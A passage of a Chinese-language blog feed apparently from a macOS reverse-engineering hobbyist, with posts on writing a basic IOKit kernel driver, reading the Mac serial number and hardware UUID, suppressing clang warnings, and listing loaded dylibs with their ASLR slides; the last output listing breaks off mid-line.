OSDeclareDefaultStructors(com_osxkernel_driver_IOKitTest)</div><div class="line">    </div><div class="line"><span class="keyword">public</span>:</div><div class="line">    <span class="comment">//该方法与Cocoa中的init和C++中的构造方法类似</span></div><div class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">bool</span> <span class="title">init</span><span class="params">(OSDictionary* dictionary = <span class="literal">NULL</span>)</span></span>;</div><div class="line">    <span class="comment">//该方法与Cocoa中的dealloc和C++中的析构方法类似</span></div><div class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">free</span><span class="params">(<span class="keyword">void</span>)</span></span>;</div><div class="line">    </div><div class="line">    <span class="comment">//进行驱动匹配时调用</span></div><div class="line">    <span class="function"><span class="keyword">virtual</span> IOService* <span class="title">probe</span><span class="params">(IOService* provider, SInt32* score)</span></span>;</div><div class="line">    <span class="comment">//当匹配成功后加载驱动</span></div><div class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">bool</span> <span class="title">start</span><span class="params">(IOService *provider)</span></span>;</div><div class="line">    <span class="comment">//当硬件移除时或卸载驱动</span></div><div class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">stop</span><span class="params">(IOService *provider)</span></span>;</div><div class="line">&#125;;</div></pre></td></tr></table></figure><p>在IOKitTest.cpp中输入以下的代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"IOKitTest.h"</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;IOKit/IOLib.h&gt;</span></span></div><div class="line"><span class="comment">//让你拥有Cocoa中的super关键字一样的体验</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> super IOService</span></div><div class="line"><span class="comment">//和头文件中的宏定义类似，自动生成一些特定代码</span></div><div class="line">OSDefineMetaClassAndStructors(com_osxkernel_driver_IOKitTest, IOService)</div><div class="line"><span class="comment">//该方法打印出dict的内容</span></div><div class="line"><span class="keyword">bool</span> com_osxkernel_driver_IOKitTest::init(OSDictionary *dict)</div><div class="line">&#123;</div><div class="line">    <span class="keyword">bool</span> res = super::init(dict);</div><div class="line">    IOLog(<span class="string">"IOKitTest::init abcd\n"</span>);</div><div class="line">    </div><div class="line">    OSCollectionIterator *iter = OSCollectionIterator::withCollection(dict);</div><div class="line">    <span class="keyword">if</span> (iter)</div><div class="line">    &#123;</div><div class="line">        OSObject *object = <span class="literal">NULL</span>;</div><div class="line">        <span class="keyword">while</span> ((object = iter-&gt;getNextObject()))</div><div class="line">        &#123;</div><div class="line">            OSSymbol *key = OSDynamicCast(OSSymbol, object);</div><div class="line">            IOLog(<span class="string">"key:%s  "</span>,key-&gt;getCStringNoCopy());</div><div class="line">            OSString *value = OSDynamicCast(OSString, dict-&gt;getObject(key));</div><div class="line">            <span class="keyword">if</span> (value != <span class="literal">NULL</span>)</div><div class="line">            &#123;</div><div class="line">                IOLog(<span class="string">"value:%s\n"</span>,value-&gt;getCStringNoCopy());</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    </div><div class="line">    <span class="keyword">return</span> res;</div><div class="line">&#125;</div><div class="line"><span class="keyword">void</span> com_osxkernel_driver_IOKitTest::<span class="built_in">free</span>(<span class="keyword">void</span>)</div><div class="line">&#123;</div><div class="line">    IOLog(<span class="string">"IOKitTest::free\n"</span>);</div><div class="line">    super::<span class="built_in">free</span>();</div><div class="line">&#125;</div><div class="line">IOService* com_osxkernel_driver_IOKitTest::probe(IOService* provider, SInt32* score)</div><div class="line">&#123;</div><div class="line">    IOService *res = super::probe(provider, score);</div><div class="line">    IOLog(<span class="string">"IOKitTest::probe\n"</span>);</div><div class="line">    <span class="keyword">return</span> res;</div><div class="line">&#125;</div><div class="line"><span class="keyword">bool</span> com_osxkernel_driver_IOKitTest::start(IOService *provider)</div><div class="line">&#123;</div><div class="line">    <span class="keyword">bool</span> res = super::start(provider);</div><div class="line">    IOLog(<span class="string">"IOKitTest::start\n"</span>);</div><div class="line">    <span class="comment">//只有调用了此方法，应用层才可以连接该驱动</span></div><div class="line">    registerService();</div><div class="line">    <span class="keyword">return</span> res;</div><div class="line">&#125;</div><div class="line"><span class="keyword">void</span> com_osxkernel_driver_IOKitTest::stop(IOService *provider)</div><div class="line">&#123;</div><div class="line">    IOLog(<span class="string">"IOKitTest::stop\n"</span>);</div><div class="line">    super::stop(provider);</div><div class="line">&#125;</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;结合《OS X 内核编程》以及网上相关的学习，用一个例子来说明自己对macOS IOkit的理解&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;0x00-一点概念&quot;&gt;&lt;a href=&quot;#0
      
    
    </summary>
    
    
      <category term="kext" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/kext/"/>
    
  </entry>
  
  <entry>
    <title>获取macOS序列号UUID等</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2017/08/01/%E8%8E%B7%E5%8F%96macOS%E5%BA%8F%E5%88%97%E5%8F%B7UUID%E7%AD%89/%E8%8E%B7%E5%8F%96macOS%E5%BA%8F%E5%88%97%E5%8F%B7UUID%E7%AD%89/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2017/08/01/获取macOS序列号UUID等/获取macOS序列号UUID等/</id>
    <published>2017-08-01T08:50:59.000Z</published>
    <updated>2017-08-30T01:47:33.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><blockquote><p>记录下，可能会用到</p></blockquote></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div></pre></td><td class="code"><pre><div class="line">+ (NSString *)serialNumber &#123;</div><div class="line">  io_service_t platformExpert = IOServiceGetMatchingService(</div><div class="line">      kIOMasterPortDefault, IOServiceMatching(&quot;IOPlatformExpertDevice&quot;));</div><div class="line">  if (!platformExpert) return nil;</div><div class="line"></div><div class="line">  NSString *serial = CFBridgingRelease(IORegistryEntryCreateCFProperty(</div><div class="line">      platformExpert, CFSTR(kIOPlatformSerialNumberKey), kCFAllocatorDefault, 0));</div><div class="line"></div><div class="line">  IOObjectRelease(platformExpert);</div><div class="line"></div><div class="line">  return serial;</div><div class="line">&#125;</div><div class="line"></div><div class="line">+ (NSString *)hardwareUUID &#123;</div><div class="line">  io_service_t platformExpert = IOServiceGetMatchingService(</div><div class="line">      kIOMasterPortDefault, IOServiceMatching(&quot;IOPlatformExpertDevice&quot;));</div><div class="line">  if (!platformExpert) return nil;</div><div class="line"></div><div class="line">  NSString *uuid = CFBridgingRelease(IORegistryEntryCreateCFProperty(</div><div class="line">      platformExpert, CFSTR(kIOPlatformUUIDKey), kCFAllocatorDefault, 0));</div><div class="line"></div><div class="line">  IOObjectRelease(platformExpert);</div><div class="line"></div><div class="line">  return uuid;</div><div class="line">&#125;</div><div class="line"></div><div class="line">+ (NSString *)osVersion &#123;</div><div class="line">  return [SNTSystemInfo _systemVersionDictionary][@&quot;ProductVersion&quot;];</div><div class="line">&#125;</div><div class="line"></div><div class="line">+ (NSString *)osBuild &#123;</div><div class="line">  return [SNTSystemInfo _systemVersionDictionary][@&quot;ProductBuildVersion&quot;];</div><div class="line">&#125;</div><div class="line"></div><div class="line">+ (NSString *)shortHostname &#123;</div><div class="line">  return [[[SNTSystemInfo longHostname] componentsSeparatedByString:@&quot;.&quot;] firstObject];</div><div class="line">&#125;</div><div class="line"></div><div class="line">+ (NSString *)longHostname &#123;</div><div class="line">  char hostname[MAXHOSTNAMELEN];</div><div class="line">  gethostname(hostname, (int)sizeof(hostname));</div><div class="line">  return @(hostname);</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>输出：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="attr">serialnum:</span>C02R***<span class="meta">*FVH5</span></div><div class="line"><span class="attr">UUID:</span><span class="number">9</span>C090ED8-****<span class="bullet">-540</span>B-****<span class="bullet">-0</span>C186E98FDFE</div></pre></td></tr></table></figure><h3 id="忽略一些警告的标识"><a href="#忽略一些警告的标识" class="headerlink" title="忽略一些警告的标识"></a>忽略一些警告的标识</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#pragma clang diagnostic push</span></div><div class="line"><span class="comment">#pragma clang diagnostic ignored "警告名称"</span></div><div class="line"></div><div class="line">￼<span class="regexp">//</span> 被夹在这中间的代码针对于此警告都会忽视不显示出来</div><div class="line"></div><div class="line"><span class="regexp">//</span>常见警告的名称</div><div class="line"><span class="regexp">//</span><span class="number">1</span>.声明变量未使用  <span class="string">"-Wunused-variable"</span></div><div class="line"><span class="regexp">//</span><span class="number">2</span>.方法定义未实现  <span class="string">"-Wincomplete-implementation"</span></div><div class="line"><span class="regexp">//</span><span class="number">3</span>.未声明的选择器  <span class="string">"-Wundeclared-selector"</span></div><div class="line"><span class="regexp">//</span><span class="number">4</span>.参数格式不匹配  <span class="string">"-Wformat"</span></div><div class="line"><span class="regexp">//</span><span class="number">5</span>.废弃掉的方法     <span class="string">"-Wdeprecated-declarations"</span></div><div class="line"><span class="regexp">//</span><span class="number">6</span>.不会执行的代码  <span class="string">"-Wunreachable-code"</span></div><div class="line"><span class="regexp">//</span><span class="number">7</span>.忽略在arc 环境下performSelector产生的 leaks 的警告 <span class="string">"-Warc-performSelector-leaks"</span></div><div class="line"></div><div class="line"><span class="comment">#pragma clang diagnostic pop</span></div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;记录下，可能会用到&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/blockquote&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;d
      
    
    </summary>
    
      <category term="一点一点" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/%E4%B8%80%E7%82%B9%E4%B8%80%E7%82%B9/"/>
    
    
      <category term="macOS" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/macOS/"/>
    
  </entry>
  
  <entry>
    <title>遍历自身加载的dylib获取载入地址和ASLR地址</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2017/08/01/%E9%81%8D%E5%8E%86%E8%87%AA%E8%BA%AB%E5%8A%A0%E8%BD%BD%E7%9A%84dylib%E8%8E%B7%E5%8F%96%E8%BD%BD%E5%85%A5%E5%9C%B0%E5%9D%80%E5%92%8CASLR%E5%9C%B0%E5%9D%80%E7%AD%89/%E9%81%8D%E5%8E%86%E8%87%AA%E8%BA%AB%E5%8A%A0%E8%BD%BD%E7%9A%84dylib%E8%8E%B7%E5%8F%96%E8%BD%BD%E5%85%A5%E5%9C%B0%E5%9D%80%E5%92%8CASLR%E5%9C%B0%E5%9D%80%E7%AD%89/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2017/08/01/遍历自身加载的dylib获取载入地址和ASLR地址等/遍历自身加载的dylib获取载入地址和ASLR地址等/</id>
    <published>2017-08-01T08:27:59.000Z</published>
    <updated>2017-08-02T08:39:50.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><blockquote><p>通过macho/dyld.h提供的函数，程序可以获取到自身加载的dylib信息，这里做个简单记录</p></blockquote></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;mach-o/dyld.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">getDylibInfo</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"*****Created by 4ch12dy*****\nDyld image count is: %d.\n"</span>, _dyld_image_count());</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; _dyld_image_count(); i++) &#123;</div><div class="line">        <span class="keyword">char</span> *image_name = (<span class="keyword">char</span> *)_dyld_get_image_name(i);</div><div class="line">        <span class="keyword">const</span> <span class="keyword">struct</span> mach_header *mh = _dyld_get_image_header(i);</div><div class="line">        <span class="keyword">intptr_t</span> vmaddr_slide = _dyld_get_image_vmaddr_slide(i);</div><div class="line">        </div><div class="line">        <span class="built_in">printf</span>(<span class="string">"Image name %s at address 0x%llx and ASLR slide 0x%lx.\n"</span>,</div><div class="line">               image_name, (<span class="keyword">mach_vm_address_t</span>)mh, vmaddr_slide);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</div><div class="line">getDylibInfo();</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>输出：</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div></pre></td><td class="code"><pre><div class="line">*****Created by <span class="number">4</span>ch12dy*****  </div><div class="line">Dyld image count <span class="symbol">is:</span> <span class="number">41</span>.  </div><div class="line">Image name /Users/king/Desktop/./dylibinfo at address <span class="number">0x106a5c000</span> and ASLR slide <span class="number">0x6a5c000</span>.  </div><div class="line">Image name /usr/<span class="class"><span class="keyword">lib</span>/<span class="title">libSystem</span>.<span class="title">B</span>.<span class="title">dylib</span> <span class="title">at</span> <span class="title">address</span> 0<span class="title">x7fff8a0e2000</span> <span class="title">and</span> <span class="title">ASLR</span> <span class="title">slide</span> 0<span class="title">x991c000</span>.  </span></div><div class="line">Image name /usr/<span class="class"><span class="keyword">lib</span>/<span class="title">system</span>/<span class="title">libcache</span>.<span class="title">dylib</span> <span class="title">at</span> <span class="title">address</span> 0<span class="title">x7fff89c95000</span> <span class="title">and</span> <span class="title">ASLR</span> <span class="title">slide</span> 0<span class="title">x991c000</span>.  </span></div><div class="line">Image name /usr/<span class="class"><span class="keyword">lib</span>/<span class="title">system</span>/<span class="title">libcommonCrypto</span>.<span class="title">dylib</span> <span class="title">at</span> <span class="title">address</span> 0<span class="title">x7fff8fc8d000</span> <span class="title">and</span> <span class="title">ASLR</span> <span class="title">slide</span> 0<span class="title">x991c000</span>.  </span></div><div class="line">Image name /usr/<span class="class"><span class="keyword">lib</span>/<span class="title">system</span>/<span class="title">libcompiler_rt</span>.<span class="title">dylib</span> <span class="title">at</span> <span class="title">address</span> 0<span class="title">x7fff95695000</span> <span class="title">and</span> <span class="title">ASLR</span> <span class="title">slide</span> 0<span class="title">x991c000</span>.  </span></div><div class="line">Image name /usr/<span class="class"><span class="keyword">lib</span>/<span class="title">system</span>/<span class="title">libcopyfile</span>.<span class="title">dylib</span> <span class="title">at</span> <span class="title">address</span> 0<span class="title">x7fff911fd000</span> <span class="title">and</span> <span class="title">ASLR</span> <span class="title">slide</span> 0<span class="title">x991c000</span>.  </span></div><div class="line">Image name /usr/<span class="class"><span class="keyword">lib</span>/<span class="title">system</span>/<span class="title">libcorecrypto</span>.<span class="title">dylib</span> <span class="title">at</span> <span class="title">address</span> 0<span class="title">x7fff8ebd2000</span> <span class="title">and</span> <span class="title">ASLR</span> <span class="title">slide</span> 0<span class="title">x991c000</span>.  </span></div><div class="line">Image name /usr/<span class="class"><span class="keyword">lib</span>/<span class="title">system</span>/<span class="title">libdispatch</span>.<span class="title">dylib</span> <span class="title">at</span> <span class="title">address</span> 0<span class="title">x7fff8fd49000</span> <span class="title">and</span> <span class="title">ASLR</span> <span class="title">slide</span> 0<span class="title">x991c000</span>.  </span></div><div class="line">Image name /usr/<span class="class"><span class="keyword">lib</span>/<span class="title">system</span>/<span class="title">libdyld</span>.<span class="title">dylib</span> <span class="title">at</span> <span class="title">address</span> 0<span class="title">x7fff97fcc000</span> <span class="title">and</span> <span class="title">ASLR</span> <span class="title">slide</span> 0<span class="title">x991c000</span>.  </span></div><div class="line">Image name /usr/<span class="class"><span class="keyword">lib</span>/<span class="title">system</span>/<span class="title">libkeymgr</span>.<span class="title">dylib</span> <span class="title">at</span> <span class="title">address</span> 0<span class="title">x7fff8a8dd000</span> <span class="title">and</span> <span class="title">ASLR</span> <span class="title">slide</span> 0<span class="title">x991c000</span>.  </span></div><div class="line">Image name /usr/<span class="class"><span class="keyword">lib</span>/<span class="title">system</span>/<span class="title">liblaunch</span>.<span class="title">dylib</span> <span class="title">at</span> <span class="title">address</span> 0<span class="title">x7fff925b2000</span> <span class="title">and</span> <span class="title">ASLR</span> <span class="title">slide</span> 0<span class="title">x991c000</span>.  </span></div><div class="line">Image name /usr/<span class="class"><span class="keyword">lib</span>/<span class="title">system</span>/<span class="title">libmacho</span>.<span class="title">dylib</span> <span class="title">at</span> <span class="title">address</span> 0<span class="title">x7fff9e2af000</span> <span class="title">and</span> <span class="title">ASLR</span> <span class="title">slide</span> 0<span class="title">x991c000</span>.  </span></div><div class="line">Image name /usr/<span class="class"><span class="keyword">lib</span>/<span class="title">system</span>/<span class="title">libquarantine</span>.<span class="title">dylib</span> <span class="title">at</span> <span class="title">address</span> 0<span class="title">x7fff9673a000</span> <span class="title">and</span> <span class="title">ASLR</span> <span class="title">slide</span> 0<span class="title">x991c000</span>.  </span></div><div class="line">Image name /usr/<span class="class"><span class="keyword">lib</span>/<span class="title">system</span>/<span class="title">libremovefile</span>.<span class="title">dylib</span> <span class="title">at</span> <span class="title">address</span> 0<span class="title">x7fff93a7f000</span> <span class="title">and</span> <span class="title">ASLR</span> <span class="title">slide</span> 0<span class="title">x991c000</span>.  </span></div><div class="line">Image name /usr/<span class="class"><span class="keyword">lib</span>/<span class="title">system</span>/<span class="title">libsystem_asl</span>.<span class="title">dylib</span> <span class="title">at</span> <span class="title">address</span> 0<span class="title">x7fff9252f000</span> <span class="title">and</span> <span class="title">ASLR</span> <span class="title">slide</span> 0<span class="title">x991c000</span>.  </span></div><div class="line">Image name /usr/<span class="class"><span class="keyword">lib</span>/<span class="title">system</span>/<span class="title">libsystem_blocks</span>.<span class="title">dylib</span> <span class="title">at</span> <span class="title">address</span> 0<span class="title">x7fff9354c000</span> <span class="title">and</span> <span class="title">ASLR</span> <span class="title">slide</span> 0<span class="title">x991c000</span>.  </span></div><div class="line">Image name /usr/<span class="class"><span class="keyword">lib</span>/<span class="title">system</span>/<span class="title">libsystem_c</span>.<span class="title">dylib</span> <span class="title">at</span> <span class="title">address</span> 0<span class="title">x7fff954f7000</span> <span class="title">and</span> <span class="title">ASLR</span> <span class="title">slide</span> 0<span class="title">x991c000</span>.  </span></div><div class="line">Image name /usr/<span class="class"><span class="keyword">lib</span>/<span class="title">system</span>/<span class="title">libsystem_configuration</span>.<span class="title">dylib</span> <span class="title">at</span> <span class="title">address</span> 0<span class="title">x7fff90772000</span> <span class="title">and</span> <span class="title">ASLR</span> <span class="title">slide</span> 0<span class="title">x991c000</span>.  </span></div><div class="line">Image name /usr/<span class="class"><span class="keyword">lib</span>/<span class="title">system</span>/<span class="title">libsystem_coreservices</span>.<span class="title">dylib</span> <span class="title">at</span> <span class="title">address</span> 0<span class="title">x7fff8ca80000</span> <span class="title">and</span> <span class="title">ASLR</span> <span class="title">slide</span> 0<span class="title">x991c000</span>.  </span></div><div class="line">Image name /usr/<span class="class"><span class="keyword">lib</span>/<span class="title">system</span>/<span class="title">libsystem_coretls</span>.<span class="title">dylib</span> <span class="title">at</span> <span class="title">address</span> 0<span class="title">x7fff934e8000</span> <span class="title">and</span> <span class="title">ASLR</span> <span class="title">slide</span> 0<span class="title">x991c000</span>.  </span></div><div class="line">Image name /usr/<span class="class"><span class="keyword">lib</span>/<span class="title">system</span>/<span class="title">libsystem_dnssd</span>.<span class="title">dylib</span> <span class="title">at</span> <span class="title">address</span> 0<span class="title">x7fff917b2000</span> <span class="title">and</span> <span class="title">ASLR</span> <span class="title">slide</span> 0<span class="title">x991c000</span>.  </span></div><div class="line">Image name /usr/<span class="class"><span class="keyword">lib</span>/<span class="title">system</span>/<span class="title">libsystem_info</span>.<span class="title">dylib</span> <span class="title">at</span> <span class="title">address</span> 0<span class="title">x7fff921dc000</span> <span class="title">and</span> <span class="title">ASLR</span> <span class="title">slide</span> 0<span class="title">x991c000</span>.  </span></div><div class="line">Image name /usr/<span class="class"><span class="keyword">lib</span>/<span class="title">system</span>/<span class="title">libsystem_kernel</span>.<span class="title">dylib</span> <span class="title">at</span> <span class="title">address</span> 0<span class="title">x7fff962e9000</span> <span class="title">and</span> <span class="title">ASLR</span> <span class="title">slide</span> 0<span class="title">x991c000</span>.  </span></div><div class="line">Image name /usr/<span class="class"><span class="keyword">lib</span>/<span class="title">system</span>/<span class="title">libsystem_m</span>.<span class="title">dylib</span> <span class="title">at</span> <span class="title">address</span> 0<span class="title">x7fff9ea96000</span> <span class="title">and</span> <span class="title">ASLR</span> <span class="title">slide</span> 0<span class="title">x991c000</span>.  </span></div><div class="line">Image name /usr/<span class="class"><span class="keyword">lib</span>/<span class="title">system</span>/<span class="title">libsystem_malloc</span>.<span class="title">dylib</span> <span class="title">at</span> <span class="title">address</span> 0<span class="title">x7fff9c890000</span> <span class="title">and</span> <span class="title">ASLR</span> <span class="title">slide</span> 0<span class="title">x991c000</span>.  </span></div><div class="line">Image name /usr/<span class="class"><span class="keyword">lib</span>/<span class="title">system</span>/<span class="title">libsystem_network</span>.<span class="title">dylib</span> <span class="title">at</span> <span class="title">address</span> 0<span class="title">x7fff8c945000</span> <span class="title">and</span> <span class="title">ASLR</span> <span class="title">slide</span> 0<span class="title">x991c000</span>.  </span></div><div class="line">Image name /usr/<span class="class"><span class="keyword">lib</span>/<span class="title">system</span>/<span class="title">libsystem_networkextension</span>.<span class="title">dylib</span> <span class="title">at</span> <span class="title">address</span> 0<span class="title">x7fff91223000</span> <span class="title">and</span> <span class="title">ASLR</span> <span class="title">slide</span> 0<span class="title">x991c000</span>.  </span></div><div class="line">Image name /usr/<span class="class"><span class="keyword">lib</span>/<span class="title">system</span>/<span class="title">libsystem_notify</span>.<span class="title">dylib</span> <span class="title">at</span> <span class="title">address</span> 0<span class="title">x7fff97081000</span> <span class="title">and</span> <span class="title">ASLR</span> <span class="title">slide</span> 0<span class="title">x991c000</span>.  </span></div><div class="line">Image name /usr/<span class="class"><span class="keyword">lib</span>/<span class="title">system</span>/<span class="title">libsystem_platform</span>.<span class="title">dylib</span> <span class="title">at</span> <span class="title">address</span> 0<span class="title">x7fff8fb26000</span> <span class="title">and</span> <span class="title">ASLR</span> <span class="title">slide</span> 0<span class="title">x991c000</span>.  </span></div><div class="line">Image name /usr/<span class="class"><span class="keyword">lib</span>/<span class="title">system</span>/<span class="title">libsystem_pthread</span>.<span class="title">dylib</span> <span class="title">at</span> <span class="title">address</span> 0<span class="title">x7fff971ba000</span> <span class="title">and</span> <span class="title">ASLR</span> <span class="title">slide</span> 0<span class="title">x991c000</span>.  </span></div><div class="line">Image name /usr/<span class="class"><span class="keyword">lib</span>/<span class="title">system</span>/<span class="title">libsystem_sandbox</span>.<span class="title">dylib</span> <span class="title">at</span> <span class="title">address</span> 0<span class="title">x7fffa00c8000</span> <span class="title">and</span> <span class="title">ASLR</span> <span class="title">slide</span> 0<span class="title">x991c000</span>.  </span></div><div class="line">Image name /usr/<span class="class"><span class="keyword">lib</span>/<span class="title">system</span>/<span class="title">libsystem_secinit</span>.<span class="title">dylib</span> <span class="title">at</span> <span class="title">address</span> 0<span class="title">x7fff93708000</span> <span class="title">and</span> <span class="title">ASLR</span> <span class="title">slide</span> 0<span class="title">x991c000</span>.  </span></div><div class="line">Image name /usr/<span class="class"><span class="keyword">lib</span>/<span class="title">system</span>/<span class="title">libsystem_trace</span>.<span class="title">dylib</span> <span class="title">at</span> <span class="title">address</span> 0<span class="title">x7fff9a886000</span> <span class="title">and</span> <span class="title">ASLR</span> <span class="title">slide</span> 0<span class="title">x991c000</span>.  </span></div><div class="line">Image name /usr/<span class="class"><span class="keyword">lib</span>/<span class="title">system</span>/<span class="title">libunc</span>.<span class="title">dylib</span> <span class="title">at</span> <span class="title">address</span> 0<span class="title">x7fff93f3e000</span> <span class="title">and</span> <span class="title">ASLR</span> <span class="title">slide</span> 0<span class="title">x991c000</span>.  </span></div><div class="line">Image name /usr/<span class="class"><span class="keyword">lib</span>/<span class="title">system</span>/<span class="title">libunwind</span>.<span class="title">dylib</span> <span class="title">at</span> <span class="title">address</span> 0<span class="title">x7fff9fcd4000</span> <span class="title">and</span> <span class="title">ASLR</span> <span class="title">slide</span> 0<span class="title">x991c000</span>.  </span></div><div class="line">Image name /usr/<span class="class"><span class="keyword">lib</span>/<span class="title">system</span>/<span class="title">libxpc</span>.<span class="title">dylib</span> <span class="title">at</span> <span class="title">address</span> 0<span class="title">x7fff9abfe000</span> <span class="title">and</span> <span class="title">ASLR</span> <span class="title">slide</span> 0<span class="title">x991c000</span>.  </span></div><div class="line">Image name /usr/<span class="class"><span class="keyword">lib</span>/<span class="title">libobjc</span>.<span class="title">A</span>.<span class="title">dylib</span> <span class="title">at</span> <span class="title">address</span> 0<span class="title">x7fff8deaa000</span> <span class="title">and</span> <span class="title">ASLR</span> <span class="title">slide</span> 0<span class="title">x991c000</span>.  </span></div><div class="line">Image name /usr/<span class="class"><span class="keyword">lib</span>/<span class="title">libauto</span>.<span class="title">dylib</span> <span class="title">at</span> <span class="title">address</span> 0<span class="title">x7fff9feb1000</span> <span class="title">and</span> <span class="title">ASLR</span> <span class="title">slide</span> 0<span class="title">x991c000</span>.  </span></div><div class="line">Image name /usr/<span class="class"><span class="keyword">lib</span>/<span class="title">libc</span>++<span class="title">abi</span>.<span class="title">dylib</span> <span class="title">at</span> <span class="title">address</span> 0<span class="title">x7fff90b13000</span> <span class="title">and</span> <span class="title">ASLR</span> <span class="title">slide</span> 0<span class="title">x991c000</span>.  </span></div><div class="line">Image name /usr/<span class="class"><span class="keyword">lib</span>/<span class="title">libc</span>++.1.<span class="title">dylib</span> <span class="title">at</span> <span class="title">address</span> 0<span class="title">x7fff97f75000</span> <span class="title">and</span> <span class="title">ASLR</span> <span class="title">slide</span> 0<span class="title">x991c000</span>.  </span></div><div class="line">Image name /usr/<span class="class"><span class="keyword">lib</span>/<span class="title">libDiagnosticMessagesClient</span>.<span class="title">dylib</span> <span class="title">at</span> <span class="title">address</span> 